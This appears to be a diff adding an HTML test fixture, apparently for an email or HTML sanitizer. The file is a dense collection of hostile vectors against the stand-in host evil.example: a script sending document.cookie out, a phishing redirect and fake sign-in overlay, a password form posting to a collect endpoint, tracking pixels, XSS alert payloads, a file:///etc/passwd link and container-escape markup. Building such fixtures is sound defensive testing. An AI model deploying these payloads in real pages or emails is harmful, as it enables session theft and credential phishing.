@@ -1,0 +1,39 @@
+<html><head>
+<base href="https://evil.example/">
+<meta http-equiv="refresh" content="0;url=https://evil.example/phish">
+<link rel="stylesheet" href="https://evil.example/track.css">
+<script>document.location = "https://evil.example/" + document.cookie</script>
+<style media="all">
+  @import url("https://evil.example/import.css");
+  @font-face { font-family: Spy; src: url(https://evil.example/font.woff) }
+  html, body { position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 2147483647; background: url(https://evil.example/bg.gif) }
+  .overlay { position: fixed !important; inset: 0; background: #fff }
+  .om-header, .om-message { display: none }
+  body ~ * { display: none }
+  p { background-image: url(https://evil.example/p.gif); color: #333 }
+</style>
+</head>
+<body onload="alert(1)">
+<div class="overlay om-header" id="m-m1">Your session expired. <a href="javascript:alert(1)">Sign in again</a></div>
+<p onclick="alert(1)" style="position:fixed;top:0;background:url('https://evil.example/inline.gif')">Inline overlay</p>
+<p style="background-image:image-set('https://evil.example/set.png' 1x); color:red">Image set</p>
+<img src="https://evil.example/pixel.gif" srcset="https://evil.example/2x.gif 2x" onerror="alert(1)">
+<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" alt="not an image">
+<img src="cid:missing@evil.example" alt="missing inline part">
+<img src="//evil.example/protocol-relative.gif" alt="relative">
+<picture><source srcset="https://evil.example/source.webp"><img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" alt="ok"></picture>
+<svg><image href="https://evil.example/svg.png"/><script>alert(1)</script></svg>
+<iframe src="https://evil.example/frame"></iframe>
+<object data="https://evil.example/flash.swf"></object>
+<embed src="https://evil.example/embed.swf">
+<video poster="https://evil.example/poster.jpg" src="https://evil.example/v.mp4"></video>
+<audio src="https://evil.example/a.mp3"></audio>
+<form action="https://evil.example/collect" method="post"><input name="password" type="password"><button formaction="https://evil.example/x">Go</button></form>
+<a href="data:text/html,<script>alert(1)</script>">data link</a>
+<a href="file:///etc/passwd">file link</a>
+<a href="relative/path">relative link</a>
+<a href="https://evil.example/ok" ping="https://evil.example/ping" target="_blank">ok link</a>
+<table background="https://evil.example/table.gif"><tr><td>Table</td></tr></table>
+<p title="<style>p{color:red}</style>">Quoted markup</p>
+</div></details></main><p>Tries to close the shell</p>
+</body></html>
